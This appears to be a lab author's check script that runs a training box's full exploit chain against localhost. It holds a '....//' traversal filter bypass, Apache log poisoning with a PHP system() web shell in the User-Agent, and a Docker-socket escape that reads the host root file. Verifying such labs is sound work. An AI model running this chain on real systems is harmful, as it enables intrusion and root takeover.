#!/usr/bin/env bash
# Runs the whole intended chain against http://127.0.0.1 and prints PASS/FAIL per stage.
# Run as root after ./up.sh, then run ./reset.sh (this script poisons the access log).
set -uo pipefail
[[ $EUID -eq 0 ]] || { echo "Run as root."; exit 1; }
cd "$(dirname "${BASH_SOURCE[0]}")"
USER_FLAG=$(grep ^USER_FLAG .env | cut -d= -f2)
ROOT_FLAG=$(cat .author/root.flag)

BASE=http://127.0.0.1
TRAV='....//....//....//....//'
FAILED=0
pass(){ echo "PASS  $1"; }
fail(){ echo "FAIL  $1"; FAILED=1; }
rce(){ curl -s -G "$BASE/" --data-urlencode "page=${TRAV}var/log/apache2/access.log" --data-urlencode "c=$1"; }

curl -s -o /dev/null -w '%{http_code}' "$BASE/" | grep -q 200 && pass "site responds" || fail "site responds"

curl -s -G "$BASE/" --data-urlencode "page=../../../../etc/passwd" | grep -q 'root:x:0:0' \
  && fail "plain ../ should be filtered" || pass "plain ../ traversal is filtered"
curl -s -G "$BASE/" --data-urlencode "page=${TRAV}etc/passwd" | grep -q 'root:x:0:0' \
  && pass "LFI works with the ....// bypass" || fail "LFI bypass"

curl -s -o /dev/null -A "<?php system(\$_GET['c']); ?>" "$BASE/"
OUT=$(rce id)
echo "$OUT" | grep -q 'uid=33(www-data)' && pass "log poisoning gives RCE as www-data" || fail "log poisoning RCE"
echo "$OUT" | grep 'uid=33(www-data)' | grep -q 'groups=33(www-data),' && pass "www-data has the docker socket group" || fail "socket group missing"

rce "docker ps" | grep -q 'tidewater' && pass "www-data can use the Docker daemon" || fail "docker daemon access"
rce "docker run --rm -v /:/mnt alpine chroot /mnt cat /root/root.txt" | grep -qF "$ROOT_FLAG" \
  && pass "escalation reads the HOST root flag" || fail "docker privesc (is alpine pulled on the host?)"
rce "cat /home/marcus/user.txt" | grep -qF "$USER_FLAG" \
  && fail "user flag should need the marcus password" || pass "user flag is protected from www-data"
rce "env" | grep -qE 'USER_FLAG|DEV_PASS' \
  && fail "secrets leaked in the environment" || pass "no secrets in the web environment"

echo
[[ $FAILED -eq 0 ]] && echo "All stages work. Run ./reset.sh next." || echo "Some stages failed - see above."
exit $FAILED
